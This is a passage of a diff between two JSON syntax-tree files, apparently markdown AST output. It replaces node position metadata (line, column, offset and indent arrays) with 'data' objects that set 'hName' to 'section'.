<               "offset": 77783
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
---
>           "data": {
>             "hName": "section"
23671,23699c23797,23798
<       "position": {
<         "start": {
<           "line": 1563,
<           "column": 1,
<           "offset": 76338
<         },
<         "end": {
<           "line": 1579,
<           "column": 94,
<           "offset": 77783
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
---
>       "data": {
>         "hName": "section"
